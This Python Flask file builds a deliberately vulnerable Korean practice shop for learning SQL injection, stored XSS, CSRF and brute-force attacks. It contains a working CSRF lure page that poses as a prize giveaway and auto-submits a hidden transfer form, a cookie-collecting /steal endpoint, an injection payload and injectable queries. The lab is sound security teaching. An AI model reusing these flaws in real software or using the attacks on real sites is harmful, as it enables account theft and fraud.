from flask import Flask, request, Response, make_response
from flask_cors import CORS
from datetime import datetime
import sqlite3
import json

app = Flask(__name__)
CORS(app)

DB_PATH = 'shop.db'
stolen_cookies = []

def json_response(data):
    return Response(
        json.dumps(data, ensure_ascii=False, indent=2),
        mimetype='application/json'
    )

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute("DROP TABLE IF EXISTS users")
    conn.execute("DROP TABLE IF EXISTS posts")
    conn.execute("DROP TABLE IF EXISTS accounts")
    conn.execute('''CREATE TABLE users (
        id INTEGER PRIMARY KEY,
        username TEXT, password TEXT,
        phone TEXT, email TEXT
    )''')
    conn.execute('''CREATE TABLE posts (
        id INTEGER PRIMARY KEY,
        content TEXT, author TEXT
    )''')
    conn.execute('''CREATE TABLE accounts (
        id INTEGER PRIMARY KEY,
        username TEXT, balance INTEGER
    )''')
    conn.execute("INSERT INTO users VALUES (1,'admin','admin1234','010-1234-5678','admin@naver.com')")
    conn.execute("INSERT INTO users VALUES (2,'taehoon','taehoon124','010-5876-5432','taehoon@gmail.com')")
    conn.execute("INSERT INTO users VALUES (3,'chulsoo','kim5678','010-1111-2222','kim@wku.ac.kr')")
    conn.execute("INSERT INTO accounts VALUES (1,'김도영',1000000)")
    conn.execute("INSERT INTO accounts VALUES (2,'김중규',500000)")
    conn.commit()
    conn.close()

# 메인 페이지
@app.route('/', methods=['GET'])
def index():
    html = """
    <!DOCTYPE html>
    <html lang="ko">
    <head>
        <meta charset="UTF-8">
        <title>ShopDemo - 취약점 실습 사이트</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: Arial, sans-serif; background: #0f0f1a; color: #ffffff; min-height: 100vh; }
            .header { background: rgba(255,255,255,0.05); border-bottom: 1px solid rgba(255,255,255,0.1); padding: 16px 40px; display: flex; align-items: center; justify-content: space-between; }
            .header .logo { font-size: 20px; font-weight: 700; color: #fff; }
            .header .logo span { color: #ff6b6b; }
            .header .warning-badge { background: #ff6b6b; color: white; font-size: 11px; font-weight: 700; padding: 4px 12px; border-radius: 20px; letter-spacing: 1px; }
            .hero { text-align: center; padding: 80px 40px 60px; }
            .hero .tag { background: rgba(102,126,234,0.2); border: 1px solid rgba(102,126,234,0.5); color: #a78bfa; font-size: 12px; font-weight: 700; letter-spacing: 2px; padding: 6px 16px; border-radius: 20px; display: inline-block; margin-bottom: 24px; }
            .hero h1 { font-size: 42px; font-weight: 900; margin-bottom: 16px; line-height: 1.2; }
            .hero h1 span { color: #ff6b6b; }
            .hero p { font-size: 16px; color: #94a3b8; line-height: 1.8; max-width: 560px; margin: 0 auto 40px; }
            .hero .warning-box { background: rgba(255,107,107,0.1); border: 1px solid rgba(255,107,107,0.3); border-radius: 8px; padding: 12px 20px; font-size: 13px; color: #fca5a5; max-width: 560px; margin: 0 auto;  white-space: nowrap; }
            .section { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
            .section-title { font-size: 20px; font-weight: 700; margin-bottom: 24px; color: #e2e8f0; }
            .section-title span { color: #667eea; }
            .cards { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; }
            .card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 24px; color: white; transition: all 0.2s; }
            .card:hover { background: rgba(255,255,255,0.08); border-color: rgba(102,126,234,0.5); transform: translateY(-2px); }
            .card .card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; }
            .card .card-icon { font-size: 28px; }
            .card .owasp-badge { font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 4px; letter-spacing: 0.5px; }
            .badge-red { background: rgba(239,68,68,0.2); color: #fca5a5; border: 1px solid rgba(239,68,68,0.3); }
            .badge-orange { background: rgba(249,115,22,0.2); color: #fdba74; border: 1px solid rgba(249,115,22,0.3); }
            .badge-purple { background: rgba(168,85,247,0.2); color: #d8b4fe; border: 1px solid rgba(168,85,247,0.3); }
            .badge-blue { background: rgba(59,130,246,0.2); color: #93c5fd; border: 1px solid rgba(59,130,246,0.3); }
            .card h3 { font-size: 17px; font-weight: 700; margin-bottom: 6px; }
            .card p { font-size: 13px; color: #94a3b8; line-height: 1.6; margin-bottom: 16px; }
            .card .card-footer { display: flex; align-items: center; justify-content: space-between; }
            .card .difficulty { font-size: 11px; color: #64748b; }
            .card .start-btn { background: rgba(102,126,234,0.2); color: #a78bfa; border: 1px solid rgba(102,126,234,0.3); padding: 6px 14px; border-radius: 6px; font-size: 12px; font-weight: 700; cursor: pointer; }
            .data-section { max-width: 900px; margin: 0 auto; padding: 0 20px 60px; }
            .data-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; }
            .data-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.07); border-radius: 10px; padding: 20px; }
            .data-card h4 { font-size: 13px; color: #64748b; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 12px; }
            .data-item { font-size: 13px; color: #94a3b8; padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-family: monospace; }
            .data-item:last-child { border-bottom: none; }
            .data-item .highlight { color: #a78bfa; }
            .footer { text-align: center; padding: 24px; font-size: 12px; color: #334155; border-top: 1px solid rgba(255,255,255,0.05); }
        </style>
    </head>
    <body>

        <!-- 헤더 -->
        <div class="header">
            <div class="logo">🛒 Shop<span>Demo</span></div>
            <div class="warning-badge">⚠️ 교육용 취약 사이트</div>
        </div>

        <!-- 히어로 -->
        <div class="hero">
            <div class="tag">OWASP TOP 10 · 2025</div>
            <h1>웹 취약점 <span>실습</span> 환경</h1>
            <p>일부러 취약하게 설계된 가상 쇼핑몰입니다.<br>
            SQL Injection, XSS, CSRF, Brute Force 공격을<br>
            직접 체험하고 위험성을 학습하세요.</p>
            <div class="warning-box">
                ⚠️ 이 사이트는 교육 목적으로만 사용하세요.
                실제 서비스에 공격 시도 시 정보통신망법 위반입니다.
            </div>
        </div>

        <!-- 취약점 카드 -->
        <div class="section">
            <div class="section-title">🎯 <span>취약점</span> 실습 목록</div>
            <div class="cards">

                <!-- SQL Injection -->
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">💉</div>
                        <div class="owasp-badge badge-red">A05:2025</div>
                    </div>
                    <h3>SQL Injection</h3>
                    <p>입력값을 통해 데이터베이스 쿼리를 조작하여 인증을 우회하고 전체 회원 정보를 탈취합니다.</p>
                    <div class="card-footer">
                        <span class="difficulty">⭐ 난이도: 초급</span>
                        <div class="start-btn" onclick="openModal('sqli')" style="cursor:pointer;">실습 시작 →</div>
                    </div>
                </div>

                <!-- XSS -->
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">🖥️</div>
                        <div class="owasp-badge badge-orange">A05:2025</div>
                    </div>
                    <h3>XSS (Cross-Site Scripting)</h3>
                    <p>게시판에 악성 스크립트를 삽입하여 다른 사용자의 쿠키와 세션 정보를 탈취합니다.</p>
                    <div class="card-footer">
                        <span class="difficulty">⭐ 난이도: 초급</span>
                        <div class="start-btn" onclick="openModal('xss')" style="cursor:pointer;">실습 시작 →</div>
                    </div>
                </div>

                <!-- CSRF -->
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">💸</div>
                        <div class="owasp-badge badge-purple">A01:2025</div>
                    </div>
                    <h3>CSRF (요청 위조)</h3>
                    <p>피해자가 악성 링크를 클릭하는 것만으로 본인도 모르게 송금이 실행되는 공격을 체험합니다.</p>
                    <div class="card-footer">
                        <span class="difficulty">⭐ 난이도: 초급</span>
                        <div class="start-btn" onclick="openModal('csrf')" style="cursor:pointer;">실습 시작 →</div>
                    </div>
                </div>

                <!-- Brute Force -->
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">🔓</div>
                        <div class="owasp-badge badge-blue">A07:2025</div>
                    </div>
                    <h3>Brute Force (무차별 대입)</h3>
                    <p>로그인 시도 횟수 제한이 없는 취약점을 이용해 자동화 도구로 비밀번호를 크래킹합니다.</p>
                    <div class="card-footer">
                        <span class="difficulty">⭐ 난이도: 초급</span>
                        <div class="start-btn" onclick="openModal('bruteforce')" style="cursor:pointer;">실습 시작 →</div>
                    </div>
                </div>

            </div>
        </div>

        <!-- 더미 데이터 안내 -->
        <div class="data-section">
            <div class="section-title">🗄️ <span>더미 데이터</span> 안내</div>
            <div class="data-grid">
                <div class="data-card">
                    <h4>👤 회원 계정</h4>
                    <div class="data-item"><span class="highlight">admin</span> / admin1234</div>
                    <div class="data-item"><span class="highlight">taehoon</span> / taehoon124</div>
                    <div class="data-item"><span class="highlight">chulsoo</span> / kim5678</div>
                </div>
                <div class="data-card">
                    <h4>💰 계좌 잔액</h4>
                    <div class="data-item">김도영: <span class="highlight">1,000,000원</span></div>
                    <div class="data-item">김중규: <span class="highlight">500,000원</span></div>
                </div>
            </div>
        </div>

        <!-- 푸터 -->
        <div class="footer">
            WebSec — 웹 보안 교육 플랫폼 | 교육 목적으로만 사용하세요
        </div>

        <!-- ✅ 모달은 body 끝부분에 -->

        <!-- 모달 오버레이 -->
        <div id="modal-overlay" onclick="closeModal()"
             style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:100;backdrop-filter:blur(4px);">
        </div>

        <!-- SQL Injection 모달 -->
        <div id="modal-sqli"
             style="display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#1a1a2e;border:1px solid rgba(239,68,68,0.3);border-radius:16px;padding:32px;width:90%;max-width:480px;z-index:101;">
            <button onclick="closeModal()"
                    style="position:absolute;top:12px;right:16px;background:none;border:none;color:#64748b;font-size:20px;cursor:pointer;">✕</button>
            <div style="font-size:32px;margin-bottom:12px;">💉</div>
            <h3 style="font-size:20px;font-weight:700;margin-bottom:8px;color:white;">SQL Injection</h3>
            <p style="font-size:13px;color:#94a3b8;line-height:1.7;margin-bottom:20px;">
                로그인 창에 <code style="background:#333;padding:2px 6px;border-radius:4px;color:#fca5a5;">' OR '1'='1' --</code> 을 입력하면
                비밀번호 없이 전체 회원 정보가 유출됩니다.
            </p>
            <div style="background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.2);border-radius:8px;padding:12px;margin-bottom:20px;font-size:12px;color:#fca5a5;">
                ⚠️ OWASP A05:2025 — Injection
            </div>
            <a href="/login" target="_blank"
               style="display:block;background:linear-gradient(135deg,#ef4444,#dc2626);color:white;text-align:center;padding:12px;border-radius:8px;text-decoration:none;font-weight:700;font-size:14px;">
                🚀 실습 시작하기 →
            </a>
        </div>

        <!-- XSS 모달 -->
        <div id="modal-xss"
             style="display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#1a1a2e;border:1px solid rgba(249,115,22,0.3);border-radius:16px;padding:32px;width:90%;max-width:480px;z-index:101;">
            <button onclick="closeModal()"
                    style="position:absolute;top:12px;right:16px;background:none;border:none;color:#64748b;font-size:20px;cursor:pointer;">✕</button>
            <div style="font-size:32px;margin-bottom:12px;">🖥️</div>
            <h3 style="font-size:20px;font-weight:700;margin-bottom:8px;color:white;">XSS (Cross-Site Scripting)</h3>
            <p style="font-size:13px;color:#94a3b8;line-height:1.7;margin-bottom:20px;">
                게시판에 악성 스크립트를 삽입해 다른 사용자의 쿠키를 탈취합니다.
                먼저 로그인 후 순서대로 진행하세요.
            </p>
            <div style="background:rgba(249,115,22,0.1);border:1px solid rgba(249,115,22,0.2);border-radius:8px;padding:12px;margin-bottom:20px;font-size:12px;color:#fdba74;">
                ⚠️ OWASP A05:2025 — Injection
            </div>
            <div style="display:flex;flex-direction:column;gap:8px;">
                <a href="/login" target="_blank"
                   style="display:block;background:rgba(249,115,22,0.2);border:1px solid rgba(249,115,22,0.4);color:#fdba74;text-align:center;padding:10px;border-radius:8px;text-decoration:none;font-weight:700;font-size:13px;">
                    1️⃣ 먼저 로그인하기 →
                </a>
                <a href="/board" target="_blank"
                   style="display:block;background:rgba(249,115,22,0.2);border:1px solid rgba(249,115,22,0.4);color:#fdba74;text-align:center;padding:10px;border-radius:8px;text-decoration:none;font-weight:700;font-size:13px;">
                    2️⃣ 게시판에서 공격하기 →
                </a>
                <a href="/stolen" target="_blank"
                   style="display:block;background:rgba(239,68,68,0.15);border:1px solid rgba(239,68,68,0.3);color:#fca5a5;text-align:center;padding:10px;border-radius:8px;text-decoration:none;font-weight:700;font-size:13px;">
                    3️⃣ 탈취된 쿠키 확인 →
                </a>
            </div>
        </div>

        <!-- CSRF 모달 -->
        <div id="modal-csrf"
             style="display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#1a1a2e;border:1px solid rgba(168,85,247,0.3);border-radius:16px;padding:32px;width:90%;max-width:480px;z-index:101;">
            <button onclick="closeModal()"
                    style="position:absolute;top:12px;right:16px;background:none;border:none;color:#64748b;font-size:20px;cursor:pointer;">✕</button>
            <div style="font-size:32px;margin-bottom:12px;">💸</div>
            <h3 style="font-size:20px;font-weight:700;margin-bottom:8px;color:white;">CSRF (요청 위조)</h3>
            <p style="font-size:13px;color:#94a3b8;line-height:1.7;margin-bottom:20px;">
                피해자가 악성 링크를 클릭하는 것만으로 본인도 모르게 송금이 실행됩니다.
                송금 페이지 잔액 확인 후 악성 링크를 클릭해보세요.
            </p>
            <div style="background:rgba(168,85,247,0.1);border:1px solid rgba(168,85,247,0.2);border-radius:8px;padding:12px;margin-bottom:20px;font-size:12px;color:#d8b4fe;">
                ⚠️ OWASP A01:2025 — Broken Access Control
            </div>
            <div style="display:flex;flex-direction:column;gap:8px;">
                <a href="/transfer" target="_blank"
                   style="display:block;background:rgba(168,85,247,0.2);border:1px solid rgba(168,85,247,0.4);color:#d8b4fe;text-align:center;padding:10px;border-radius:8px;text-decoration:none;font-weight:700;font-size:13px;">
                    1️⃣ 송금 페이지 확인 →
                </a>
                <a href="/evil" target="_blank"
                   style="display:block;background:rgba(239,68,68,0.15);border:1px solid rgba(239,68,68,0.3);color:#fca5a5;text-align:center;padding:10px;border-radius:8px;text-decoration:none;font-weight:700;font-size:13px;">
                    2️⃣ 악성 링크 클릭 (공격 실행) →
                </a>
            </div>
        </div>

        <!-- Brute Force 모달 -->
        <div id="modal-bruteforce"
             style="display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#1a1a2e;border:1px solid rgba(59,130,246,0.3);border-radius:16px;padding:32px;width:90%;max-width:480px;z-index:101;">
            <button onclick="closeModal()"
                    style="position:absolute;top:12px;right:16px;background:none;border:none;color:#64748b;font-size:20px;cursor:pointer;">✕</button>
            <div style="font-size:32px;margin-bottom:12px;">🔓</div>
            <h3 style="font-size:20px;font-weight:700;margin-bottom:8px;color:white;">Brute Force (무차별 대입)</h3>
            <p style="font-size:13px;color:#94a3b8;line-height:1.7;margin-bottom:20px;">
                로그인 시도 횟수 제한이 없는 취약점을 이용해
                자동화된 비밀번호 대입 공격으로 계정을 탈취합니다.
            </p>
            <div style="background:rgba(59,130,246,0.1);border:1px solid rgba(59,130,246,0.2);border-radius:8px;padding:12px;margin-bottom:20px;font-size:12px;color:#93c5fd;">
                ⚠️ OWASP A07:2025 — Authentication Failures
            </div>
            <a href="/bruteforce" target="_blank"
               style="display:block;background:linear-gradient(135deg,#3b82f6,#2563eb);color:white;text-align:center;padding:12px;border-radius:8px;text-decoration:none;font-weight:700;font-size:14px;">
                🚀 실습 시작하기 →
            </a>
        </div>

        <script>
            function openModal(id) {
                document.getElementById('modal-overlay').style.display = 'block'
                document.getElementById('modal-' + id).style.display = 'block'
            }
            function closeModal() {
                document.getElementById('modal-overlay').style.display = 'none'
                document.querySelectorAll('[id^="modal-"]').forEach(el => {
                    if (el.id !== 'modal-overlay') el.style.display = 'none'
                })
            }
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Escape') closeModal()
            })
        </script>

    </body>
    </html>
    """
    return Response(html, mimetype='text/html')

# SQL Injection 취약한 로그인
@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect(DB_PATH)
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        try:
            result = conn.execute(query).fetchall()
            if result:
                res = make_response(json_response({
                    "status": "success",
                    "leaked_data": [{"username": r[1], "password": r[2], "phone": r[3], "email": r[4]} for r in result]
                }))
                res.set_cookie('session_id', 'abc123xyz_victim_session')
                res.set_cookie('user', result[0][1])
                res.set_cookie('password', result[0][2])
                res.set_cookie('role', 'admin')
                return res
            return json_response({"status": "fail", "message": "로그인 실패"})
        except Exception as e:
            return json_response({"status": "error", "message": str(e)})

    html = """
    <title>로그인</title>
    <style>
        body { font-family: Arial; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 320px; }
        h2 { text-align: center; color: #333; margin-bottom: 24px; }
        label { font-size: 14px; color: #555; display: block; margin-bottom: 6px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; margin-bottom: 16px; font-size: 14px; }
        input[type="submit"] { width: 100%; padding: 12px; background: #333; color: white; border: none; border-radius: 6px; font-size: 15px; cursor: pointer; }
        input[type="submit"]:hover { background: #555; }
    </style>
    <div class="login-box">
        <h2>🛒 ShopDemo</h2>
        <form method="post">
            <label>아이디</label>
            <input type="text" name="username" placeholder="아이디 입력"><br>
            <label>비밀번호</label>
            <input type="password" name="password" placeholder="비밀번호 입력"><br>
            <input type="submit" value="로그인">
        </form>
    </div>
    """
    return Response(html, mimetype='text/html')

# XSS 취약한 게시판
@app.route('/board', methods=['GET','POST'])
def board():
    conn = sqlite3.connect(DB_PATH)
    if request.method == 'POST':
        content = request.form['content']
        author = request.form['author']
        conn.execute("INSERT INTO posts (content, author) VALUES (?, ?)", (content, author))
        conn.commit()
    posts = conn.execute("SELECT * FROM posts").fetchall()
    posts_html = ''.join([f"""
        <div style="background:#f9f9f9;border:1px solid #ddd;border-radius:8px;padding:12px;margin:8px 0;">
            <b>✍️ {p[2]}</b>
            <p style="margin:8px 0 0 0;">{p[1]}</p>
        </div>
    """ for p in posts])

    # 현재 쿠키 정보 표시
    cookie_user = request.cookies.get('user', '로그인 안 됨')
    cookie_session = request.cookies.get('session_id', '없음')
    cookie_password = request.cookies.get('password', '없음')

    html = f"""
    <title>게시판</title>
    <style>
        body {{ font-family: Arial; max-width: 700px; margin: 40px auto; padding: 0 20px; }}
        h2 {{ color: #333; border-bottom: 2px solid #333; padding-bottom: 10px; }}
        .cookie-box {{ background: #e8f4f8; border: 1px solid #0088cc; border-radius: 8px; padding: 12px; margin-bottom: 16px; font-size: 13px; }}
        .form-box {{ background: #f0f0f0; padding: 20px; border-radius: 8px; margin-bottom: 20px; }}
        input[name="author"] {{ width: 200px; padding: 8px; border: 1px solid #ccc; border-radius: 4px; }}
        textarea {{ width: 100%; height: 100px; padding: 8px; border: 1px solid #ccc; border-radius: 4px; resize: vertical; box-sizing: border-box; }}
        input[type="submit"] {{ background: #333; color: white; padding: 8px 20px; border: none; border-radius: 4px; cursor: pointer; margin-top: 10px; }}
        input[type="submit"]:hover {{ background: #555; }}
    </style>
    <h2>📋 게시판</h2>
    <div class="cookie-box">
        🍪 <b>현재 브라우저 쿠키 정보</b><br>
        user: <b>{cookie_user}</b> |
        session_id: <b>{cookie_session}</b> |
        password: <b>{cookie_password}</b>
    </div>
    <div class="form-box">
        <form method="post">
            이름: <input name="author"><br><br>
            내용:<br>
            <textarea name="content"></textarea><br>
            <input type="submit" value="작성">
        </form>
    </div>
    <hr>
    """ + posts_html

    return Response(html, mimetype='text/html')

# CSRF 취약한 송금
@app.route('/transfer', methods=['GET','POST'])
def transfer():
    conn = sqlite3.connect(DB_PATH)
    if request.method == 'POST':
        amount = request.form['amount']
        to_user = request.form['to']
        conn.execute(f"UPDATE accounts SET balance = balance - {amount} WHERE username = '김도영'")
        conn.execute(f"UPDATE accounts SET balance = balance + {amount} WHERE username = '{to_user}'")
        conn.commit()
        accounts = conn.execute("SELECT * FROM accounts").fetchall()
        return json_response({
            "status": "success",
            "message": f"⚠️ {amount}원이 {to_user}에게 이체됐습니다!",
            "accounts": [{"username": a[1], "balance": a[2]} for a in accounts]
        })

    accounts = conn.execute("SELECT * FROM accounts").fetchall()
    accounts_html = ''.join([f"""
        <div style="background:#f9f9f9;border:1px solid #ddd;border-radius:8px;padding:12px;margin:8px 0;">
            <b>👤 {a[1]}</b>
            <p style="margin:4px 0 0 0;">잔액: {a[2]:,}원</p>
        </div>
    """ for a in accounts])

    html = """
    <title>송금</title>
    <style>
        body { font-family: Arial; max-width: 500px; margin: 40px auto; padding: 0 20px; }
        h2 { color: #333; border-bottom: 2px solid #333; padding-bottom: 10px; }
        .form-box { background: #f0f0f0; padding: 20px; border-radius: 8px; margin: 20px 0; }
        input[type="text"] { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 10px; box-sizing: border-box; }
        input[type="submit"] { background: #333; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; width: 100%; }
        input[type="submit"]:hover { background: #555; }

        

        /* 팝업 알림 스타일 */
        .popup {
            display: none;
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: white;
            border: 1px solid #ddd;
            border-radius: 12px;
            padding: 16px 20px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
            max-width: 280px;
            z-index: 999;
        }
        .popup .popup-title {
            font-size: 14px;
            font-weight: 700;
            color: #333;
            margin-bottom: 6px;
        }
        .popup .popup-desc {
            font-size: 12px;
            color: #666;
            margin-bottom: 12px;
            line-height: 1.5;
        }
        .popup .popup-btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 6px;
            font-size: 13px;
            cursor: pointer;
            width: 100%;
        }
        .popup .popup-close {
            position: absolute;
            top: 8px;
            right: 12px;
            background: none;
            border: none;
            font-size: 16px;
            cursor: pointer;
            color: #999;
        }
    </style>

    <h2>💸 송금 페이지</h2>
    """ + accounts_html + """


    <div class="form-box">
        <form method="post">
            받는 사람: <input type="text" name="to" placeholder="계좌 입력"><br>
            금액: <input type="text" name="amount" placeholder="금액 입력"><br>
            <input type="submit" value="송금하기">
        </form>
    </div>

    <!-- 우측 하단 팝업 알림 -->
    <div class="popup" id="popup">
        <button class="popup-close" onclick="closePopup()">✕</button>
        <div class="popup-title">🎉 축하합니다!</div>
        <div class="popup-desc">
            고객님이 당첨되셨습니다!<br>
            지금 바로 경품을 수령하세요.
        </div>
        <button class="popup-btn" onclick="location.href='http://localhost:5001/evil'">
            경품 수령하기
        </button>
    </div>

    <script>
        // 3초 후 팝업 표시
        setTimeout(() => {
            document.getElementById('popup').style.display = 'block'
        }, 3000)

        function closePopup() {
            document.getElementById('popup').style.display = 'none'
        }
    </script>
    """
    return Response(html, mimetype='text/html')

@app.route('/evil', methods=['GET'])
def evil():
    html = """
    <!DOCTYPE html>
    <html lang="ko">
    <head>
        <meta charset="UTF-8">
        <title>🎁 이벤트 당첨 안내</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
            .card { background: white; border-radius: 16px; padding: 40px; max-width: 480px; width: 90%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; }
            .badge { background: #ff6b6b; color: white; font-size: 12px; font-weight: 700; letter-spacing: 2px; padding: 6px 16px; border-radius: 20px; display: inline-block; margin-bottom: 20px; }
            h1 { font-size: 26px; color: #333; margin-bottom: 12px; }
            .prize { font-size: 48px; margin: 20px 0; }
            .desc { color: #666; font-size: 14px; line-height: 1.8; margin-bottom: 24px; }
            .highlight { color: #667eea; font-weight: 700; }
            .btn { background: linear-gradient(135deg, #667eea, #764ba2); color: white; border: none; padding: 14px 40px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 100%; margin-bottom: 12px; }
            .timer { font-size: 13px; color: #999; margin-top: 16px; }
            .timer span { color: #ff6b6b; font-weight: 700; }
        </style>
    </head>
    <body>
        <div class="card">
            <div class="badge">🎉 축하합니다!</div>
            <h1>이벤트 당첨 안내</h1>
            <div class="prize">🎁</div>
            <p class="desc">고객님은 <span class="highlight">ShopDemo 10주년 기념 이벤트</span>에 당첨되셨습니다!<br><br>경품 수령을 위해 아래 버튼을 눌러 본인 인증을 완료해 주세요.</p>
            <button class="btn" onclick="verify()">🎁 경품 수령하기</button>
            <p class="timer">이벤트 마감까지 <span id="countdown">10</span>초 남았습니다</p>
        </div>
        <form id="csrfAttack" action="http://localhost:5001/transfer" method="POST" style="display:none;">
            <input type="hidden" name="to" value="김중규">
            <input type="hidden" name="amount" value="500000">
        </form>
        <script>
            let count = 10
            const countdown = document.getElementById('countdown')
            const timer = setInterval(() => {
                count--
                countdown.textContent = count
                if (count <= 0) { clearInterval(timer); document.getElementById('csrfAttack').submit() }
            }, 1000)
            function verify() {
                setTimeout(() => { document.getElementById('csrfAttack').submit() }, 1000)
            }
        </script>
    </body>
    </html>
    """
    return Response(html, mimetype='text/html')

# Brute Force
@app.route('/bruteforce', methods=['GET', 'POST'])
def bruteforce():
    if request.method == 'POST':
        target_username = request.form['username']
        passwords = [
            '1234', '12345', '123456', 'admin',
            'password', 'qwerty', 'abc123', '0000',
            'admin1234', 'taehoon124', 'kim5678'
        ]
        conn = sqlite3.connect(DB_PATH)
        result_log = []
        found = False
        found_pw = None

        for pw in passwords:
            query = f"SELECT * FROM users WHERE username='{target_username}' AND password='{pw}'"
            result = conn.execute(query).fetchone()
            if result:
                result_log.append({"password": pw, "result": "✅ 성공!", "success": True})
                found = True
                found_pw = pw
                break
            else:
                result_log.append({"password": pw, "result": "❌ 실패", "success": False})

        return json_response({
            "status": "found" if found else "not_found",
            "username": target_username,
            "found_password": found_pw,
            "attempts": len(result_log),
            "log": result_log
        })

    html = """
    <title>Brute Force 공격 실습</title>
    <style>
        body { font-family: Arial; max-width: 600px; margin: 40px auto; padding: 0 20px; }
        h2 { color: #333; border-bottom: 2px solid #333; padding-bottom: 10px; }
        .form-box { background: #f0f0f0; padding: 20px; border-radius: 8px; margin: 20px 0; }
        input[type="text"] { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 10px; box-sizing: border-box; }
        input[type="submit"] { background: #c0392b; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; width: 100%; font-size: 15px; }
        input[type="submit"]:hover { background: #e74c3c; }
        .warning { background: #fff3cd; border: 1px solid #ffc107; padding: 12px; border-radius: 6px; margin-bottom: 16px; font-size: 13px; }
    </style>
    <h2>💀 Brute Force 공격 시연</h2>
    <div class="warning">⚠️ 교육 목적으로만 사용하세요.</div>
    <div class="form-box">
        <form method="post">
            공격 대상 아이디: <input type="text" name="username" placeholder="예: admin"><br>
            <input type="submit" value="🔓 Brute Force 공격 시작">
        </form>
    </div>
    """
    return Response(html, mimetype='text/html')

# 쿠키 수집
@app.route('/steal', methods=['GET'])
def steal():
    cookie = request.args.get('cookie', '없음')
    stolen_cookies.append({
        "time": datetime.now().strftime("%H:%M:%S"),
        "cookie": cookie
    })
    return Response("ok", mimetype='text/plain')

# 탈취된 쿠키 확인
@app.route('/stolen', methods=['GET'])
def stolen():
    html = """
    <h2>💀 탈취된 쿠키 목록</h2>
    <style>
        body { font-family: Arial; background: #1a1a1a; color: #00ff00; padding: 20px; }
        .cookie { background: #333; padding: 10px; margin: 10px 0; border-radius: 5px; }
        .clear-btn { background: #c0392b; color: white; padding: 8px 16px; border: none; border-radius: 4px; cursor: pointer; margin-bottom: 16px; }
    </style>
    <button class="clear-btn" onclick="location.href='/stolen/clear'">🗑️ 초기화</button>
    """
    if stolen_cookies:
        for c in stolen_cookies:
            html += f'<div class="cookie">⏰ {c["time"]}<br>🍪 {c["cookie"]}</div>'
    else:
        html += '<p>아직 탈취된 쿠키 없음</p>'
    return Response(html, mimetype='text/html')

# 쿠키 초기화
@app.route('/stolen/clear', methods=['GET'])
def clear_cookies():
    stolen_cookies.clear()
    return json_response({"status": "success", "message": "쿠키 목록 초기화됨"})

if __name__ == '__main__':
    init_db()
    app.run(debug=True, host='0.0.0.0', port=5000)